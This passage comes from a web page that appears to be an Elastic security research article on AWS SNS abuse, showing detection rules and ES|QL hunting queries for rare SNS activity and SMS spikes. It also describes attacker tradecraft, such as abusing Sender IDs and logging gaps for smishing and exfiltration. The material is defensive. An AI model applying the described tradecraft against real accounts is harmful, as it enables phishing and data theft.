(aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Ignoring the topic ARN during aggregation is important to identify first occurrence anomalies of subscribing to SNS topic with an email. By not grouping subscriptions by topic ARN, we ensure that the query focuses on detecting unexpected or infrequent subscriptions only, regardless of specific topics already established.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Another query may be required with the user identity ARN as an inclusion filter to identify which topic they subscribed to.\"}),`\n`,(0,i.jsx)(e.li,{children:\"If an anomalous user-agent name is observed, a secondary investigation into the user-agent string may be required to determine if it's associated with automated scripts, uncommon browsers, or mismatched platforms. While it is simple to fake these, adversaries have been known not to for undisclosed reasons.\"}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"sns-topic-message-published-by-rare-user\",children:\"SNS Topic Message Published by Rare User\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/lateral_movement_sns_topic_message_publish_by_rare_user.toml\",rel:\"nofollow\",children:\"Detection Rule Source\"}),(0,i.jsx)(e.br,{}),`\n`,(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_topic_message_published_by_rare_user.md\",rel:\"nofollow\",children:\"Hunting Query Source\"})]}),`\n`,(0,i.jsx)(e.p,{children:\"Identifies when a message is published to an SNS topic from an unusual user identity ARN in AWS. If the role or permission policy does not practice PoLP, publishing to SNS topics may be allowed and thus abused. For example, default roles supplied via AWS Marketplace that allow publishing to SNS topics. It may also identify rogue entities that once were pushing to SNS topics but no longer are being abused if credentials are compromised. Note that this focuses solely on EC2 instances, but you could adjust to account for different publish anomalies based on source, region, user agent and more.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Our query leverages KQL and New Terms rule type to focus on subscriptions that specify an email address. Unfortunately, CloudTrail redacts the email address subscribed, as this would be a vital asset for investigation.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`event.dataset: \"aws.cloudtrail\"\n    and event.provider: \"sns.amazonaws.com\"\n    and event.action: \"Publish\"\n    and aws.cloudtrail.user_identity.type: \"AssumedRole\"\n    and aws.cloudtrail.user_identity.arn: *i-*\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"New Terms value\"}),\": aws.cloudtrail.user_identity.arn\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-query-esql-2\",children:\"Hunting Query (ES|QL)\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Our hunting query leverages ES|QL and also focused on SNS logs where the API action is \",(0,i.jsx)(e.em,{children:\"Publish\"}),\". This only triggers if the user identity type is an assumed role and the user identity ARN is an EC2 instance ID. Aggregating on \",(0,i.jsx)(e.strong,{children:\"account ID\"}),\", \",(0,i.jsx)(e.strong,{children:\"entity\"}),\", \",(0,i.jsx)(e.strong,{children:\"assumed role\"}),\", \",(0,i.jsx)(e.strong,{children:\"SNS topic\"}),\" and \",(0,i.jsx)(e.strong,{children:\"region\"}),\" help us identify any further anomalies based on expectancy of this activity. We can leverage the user agent to identify these calls being made by unusual tools or software as well.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`from logs-aws.cloudtrail-*\n| where @timestamp \u003e now() - 7 day\n| WHERE\n    event.dataset == \"aws.cloudtrail\" AND\n    event.provider == \"sns.amazonaws.com\" AND\n    event.action == \"Publish\"\n    and aws.cloudtrail.user_identity.type == \"AssumedRole\"\n| DISSECT aws.cloudtrail.request_parameters \"{%{?message_key}=%{message}, %{?topic_key}=%{topic_arn}}\"\n| DISSECT aws.cloudtrail.user_identity.arn \"%{?}:assumed-role/%{assumed_role_name}/%{entity}\"\n| DISSECT user_agent.original \"%{user_agent_name} %{?user_agent_remainder}\"\n| WHERE STARTS_WITH(entity, \"i-\")\n| STATS regional_topic_publish_count = COUNT(*) by cloud.account.id, entity, assumed_role_name, topic_arn, cloud.region, user_agent_name\n| SORT regional_topic_publish_count ASC\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Hunting Notes:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.\"}),`\n`,(0,i.jsx)(e.li,{children:\"If you notice Terraform, Pulumi, etc. it may be related to testing environments, maintenance or more.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Python SDKs that are not AWS, may indicate custom tooling or scripts being leveraged.\"}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"sns-direct-to-phone-messaging-spike\",children:\"SNS Direct-to-Phone Messaging Spike\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_direct_to_phone_messaging_spike.md\",rel:\"nofollow\",children:\"Hunting Query Source\"}),(0,i.jsx)(e.br,{}),`\n`,\"MITRE ATT\u0026CK: \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1660/\",rel:\"nofollow\",children:\"T1660\"})]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Our hunting efforts for hypothesized SNS compromise\\u2014where an adversary is conducting phishing (smishing) campaigns\\u2014focus on \",(0,i.jsx)(e.em,{children:\"Publish\"}),\" API actions in AWS SNS. Specifically, we track instances where \",(0,i.jsx)(e.em,{children:\"phoneNumber\"}),\" is present in request parameters, signaling that messages are being sent directly to phone numbers rather than through an SNS topic.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Notably, instead of relying on SNS topics with pre-subscribed numbers, the adversary exploits an organization\\u2019s production Endpoint Messaging permissions, leveraging:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"An approved Origination ID (if the organization has registered one).\"}),`\n`,(0,i.jsx)(e.li,{children:\"A Sender ID (if the adversary controls one or can spoof a trusted identifier).\"}),`\n`,(0,i.jsx)(e.li,{children:\"AWS long codes or short codes (which may be dynamically assigned).\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Since AWS SNS sanitizes logs, phone numbers are not visible in CloudTrail, but deeper analysis in CloudWatch or third-party monitoring tools may help.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-query-esql-3\",children:\"Hunting Query (ES|QL)\"}),`\n`,(0,i.jsx)(e.p,{children:\"This query detects a spike in direct SNS messages, which may indicate smishing campaigns from compromised AWS accounts.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`from logs-aws.cloudtrail-*\n| WHERE @timestamp \u003e now() - 7 day\n| EVAL target_time_window = DATE_TRUNC(10 seconds, @timestamp)\n| WHERE\n    event.dataset == \"aws.cloudtrail\" AND\n    event.provider == \"sns.amazonaws.com\" AND\n    event.action == \"Publish\" AND\n    event.outcome == \"success\" AND\n    aws.cloudtrail.request_parameters LIKE \"*phoneNumber*\"\n| DISSECT user_agent.original \"%{user_agent_name} %{?user_agent_remainder}\"\n| STATS sms_message_count = COUNT(*) by target_time_window, cloud.account.id, aws.cloudtrail.user_identity.arn, cloud.region, source.address, user_agent_name\n| WHERE sms_message_count \u003e 30\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Hunting Notes:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"AWS removes phone numbers in logs, so deeper analysis via CloudWatch logs may be necessary.\"}),`\n`,(0,i.jsx)(e.li,{children:\"While investigating in CloudWatch, the message context is also sanitized. It would be ideal to investigate the message for any suspicious URL links being embedded in the text messages.\"}),`\n`,(0,i.jsx)(e.li,{children:\"You can also review AWS SNS delivery logs (if enabled) for message metadata.\"}),`\n`,(0,i.jsx)(e.li,{children:\"If messages are not using a topic-based subscription, it suggests direct targeting.\"}),`\n`,(0,i.jsx)(e.li,{children:\"The source of these requests is important, if you notice them from an EC2 instance, that is rather odd or Lambda may be an expected serverless code.\"}),`\n`]}),`\n`,(0,i.jsx)(e.h1,{id:\"takeaways\",children:\"Takeaways\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Thank you for taking the time to read this publication on \",(0,i.jsx)(e.strong,{children:\"AWS SNS Abuse: Data Exfiltration and Phishing\"}),\". We hope this research provides valuable insights into how adversaries can leverage AWS SNS for data exfiltration, smishing and phishing campaigns, as well as practical detection and hunting strategies to counter these threats.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:\"Key Takeaways:\"})}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"AWS SNS is a powerful service, but can be misused for malicious purposes, including phishing (smishing) and data exfiltration.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Adversaries may abuse production SNS permissions using pre-approved Sender IDs, Origination IDs, or long/short codes to send messages outside an organization.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Threat actors may weaponize misconfigurations in IAM policies, CloudTrail logging gaps and SNS API limitations to fly under the radar.\"}),`\n`,(0,i.jsx)(e.li,{children:\"While in-the-wild (ItW) abuse of SNS is not frequently reported, we are confident that its weaponization and targeted exploitation are already occurring or will emerge eventually.\"}),`\n`,(0,i.jsx)(e.li,{children:\"AWS CloudTrail does not capture phone numbers or messages in SNS logs, making CloudWatch third-party monitoring essential for deeper analysis\"}),`\n`,(0,i.jsx)(e.li,{children:\"Threat hunting queries can help detect SNS topics being created, subscribed to, or receiving a spike in direct messages, signaling potential abuse.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Detection strategies include monitoring SNS API actions, identifying unusual SNS message spikes and flagging anomalies from EC2 or Lambda sources.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Defensive measures should include IAM policy hardening, CloudTrail \u0026 SNS logging, anomaly-based detections and security best practices as recommended by AWS to reduce attack surface.\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"AWS SNS is often overlooked in security discussions, but as this research shows, it presents a viable attack vector for adversaries if left unmonitored. We encourage defenders to stay proactive, refine detection logic, and implement robust security controls to mitigate these risks and increase security posture.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Thanks for reading and happy hunting!\"}),`\n`,(0,i.jsx)(e.h1,{id:\"references\",children:\"References\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/\",rel:\"nofollow\",children:\"https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://permiso.io/blog/s/smishing-attack-on-aws-sms-new-phone-who-dis/\",rel:\"nofollow\",children:\"https://permiso.io/blog/s/smishing-attack-on-aws-sms-new-phone-who-dis/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://catalog.workshops.aws/build-sms-program/en-US\",rel:\"nofollow\",children:\"https://catalog.workshops.aws/build-sms-program/en-US\"})}),`\n`]})]})}function v(n={}){let{wrapper:e}=n.components||{};return e?(0,i.jsx)(e,Object.assign({},n,{children:(0,i.jsx)(d,n)})):d(n)}var A=v;return S(T);})();\n;return Component;"},"_id":"articles/aws-sns-abuse.mdx","_raw":{"sourceFilePath":"articles/aws-sns-abuse.mdx","sourceFileName":"aws-sns-abuse.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/aws-sns-abuse"},"type":"Article","imageUrl":"/assets/images/aws-sns-abuse/Security Labs Images 7.jpg","readingTime":"31 min read","series":"","url":"/aws-sns-abuse","headings":[{"level":2,"title":"Data Exfiltration via SNS","href":"#data-exfiltration-via-sns"},{"level":3,"title":"Infrastructure Setup","href":"#infrastructure-setup"},{"level":3,"title":"The Workflow in Practice: Exfiltrating Sensitive Credentials","href":"#the-workflow-in-practice-exfiltrating-sensitive-credentials"},{"level":3,"title":"Challenges for Adversaries:","href":"#challenges-for-adversaries"},{"level":3,"title":"Advantages for Adversaries","href":"#advantages-for-adversaries"},{"level":2,"title":"Smishing and Phishing","href":"#smishing-and-phishing"},{"level":3,"title":"Weaponization and Pre-Testing Considerations","href":"#weaponization-and-pre-testing-considerations"},{"level":3,"title":"**Infrastructure Setup**","href":"#infrastructure-setup-1"},{"level":2,"title":"SNS Topic Created by Rare User","href":"#sns-topic-created-by-rare-user"},{"level":3,"title":"Hunting Query (ES|QL)  ","href":"#hunting-query-esql--"},{"level":2,"title":"SNS Topic Subscription with Email by Rare User","href":"#sns-topic-subscription-with-email-by-rare-user"},{"level":3,"title":"Hunting Query (ES|QL)","href":"#hunting-query-esql"},{"level":2,"title":"SNS Topic Message Published by Rare User","href":"#sns-topic-message-published-by-rare-user"},{"level":3,"title":"Hunting Query (ES|QL)","href":"#hunting-query-esql-1"},{"level":2,"title":"SNS Direct-to-Phone Messaging Spike","href":"#sns-direct-to-phone-messaging-spike"},{"level":3,"title":"Hunting Query (ES|QL)","href":"#hunting-query-esql-2"}],"author":[{"title":"Terrance DeJesus","slug":"terrance-dejesus","description":"Senior Security Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var o=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,j=Object.prototype.hasOwnProperty;var l=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),_=(e,t)=\u003e{for(var n in t)o(e,n,{get:t[n],enumerable:!0})},c=(e,t,n,a)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let s of f(t))!j.call(e,s)\u0026\u0026s!==n\u0026\u0026o(e,s,{get:()=\u003et[s],enumerable:!(a=d(t,s))||a.enumerable});return e};var p=(e,t,n)=\u003e(n=e!=null?x(g(e)):{},c(t||!e||!e.__esModule?o(n,\"default\",{value:e,enumerable:!0}):n,e)),D=e=\u003ec(o({},\"__esModule\",{value:!0}),e);var u=l((F,i)=\u003e{i.exports=_jsx_runtime});var C={};_(C,{default:()=\u003ey,frontmatter:()=\u003eM});var r=p(u()),M={title:\"Terrance DeJesus\",description:\"Senior Security Research Engineer, Elastic\",slug:\"terrance-dejesus\"};function m(e){return(0,r.jsx)(r.Fragment,{})}function h(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(m,e)})):m(e)}var y=h;return D(C);})();\n;return Component;"},"_id":"authors/terrance-dejesus.mdx","_raw":{"sourceFilePath":"authors/terrance-dejesus.mdx","sourceFileName":"terrance-dejesus.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/terrance-dejesus"},"type":"Author","imageUrl":"","url":"/authors/terrance-dejesus"}],"category":[{"title":"Security research","slug":"security-research","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,j=Object.prototype.hasOwnProperty;var l=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),d=(t,e)=\u003e{for(var r in e)s(t,r,{get:e[r],enumerable:!0})},c=(t,e,r,a)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!j.call(t,o)\u0026\u0026o!==r\u0026\u0026s(t,o,{get:()=\u003ee[o],enumerable:!(a=f(e,o))||a.enumerable});return t};var h=(t,e,r)=\u003e(r=t!=null?x(g(t)):{},c(e||!t||!t.__esModule?s(r,\"default\",{value:t,enumerable:!0}):r,t)),p=t=\u003ec(s({},\"__esModule\",{value:!0}),t);var i=l((X,u)=\u003e{u.exports=_jsx_runtime});var D={};d(D,{default:()=\u003eC,frontmatter:()=\u003ey});var n=h(i()),y={title:\"Security research\",slug:\"security-research\"};function m(t){return(0,n.jsx)(n.Fragment,{})}function M(t={}){let{wrapper:e}=t.components||{};return e?(0,n.jsx)(e,Object.assign({},t,{children:(0,n.jsx)(m,t)})):m(t)}var C=M;return p(D);})();\n;return Component;"},"_id":"categories/security-research.mdx","_raw":{"sourceFilePath":"categories/security-research.mdx","sourceFileName":"security-research.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/security-research"},"type":"Category","url":"/categories/security-research"},{"title":"Security operations","slug":"security-operations","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)s(t,n,{get:e[n],enumerable:!0})},i=(t,e,n,a)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of p(e))!g.call(t,o)\u0026\u0026o!==n\u0026\u0026s(t,o,{get:()=\u003ee[o],enumerable:!(a=f(e,o))||a.enumerable});return t};var d=(t,e,n)=\u003e(n=t!=null?x(_(t)):{},i(e||!t||!t.__esModule?s(n,\"default\",{value:t,enumerable:!0}):n,t)),y=t=\u003ei(s({},\"__esModule\",{value:!0}),t);var u=j((b,c)=\u003e{c.exports=_jsx_runtime});var F={};l(F,{default:()=\u003eD,frontmatter:()=\u003eM});var r=d(u()),M={title:\"Security operations\",slug:\"security-operations\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var D=C;return y(F);})();\n;return Component;"},"_id":"categories/security-operations.mdx","_raw":{"sourceFilePath":"categories/security-operations.mdx","sourceFileName":"security-operations.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/security-operations"},"type":"Category","url":"/categories/security-operations"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"aws-sns-abuse"},"buildId":"HfUB8udjYzGgHnApGHQQO","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>